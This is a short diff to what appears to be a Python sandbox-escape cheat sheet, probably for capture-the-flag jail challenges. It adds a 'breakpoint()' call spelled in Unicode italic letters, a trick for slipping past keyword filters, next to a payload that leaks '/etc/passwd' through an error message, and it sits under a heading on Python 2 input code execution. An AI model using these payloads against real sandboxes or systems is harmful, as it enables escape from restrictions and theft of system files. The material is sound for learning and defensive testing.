@@ -27,6 +27,7 @@
   ```py
   int(open('/etc/passwd', 'r').read())
   ?????(????)
+  𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
   ```
 
 - **python2 input rce**
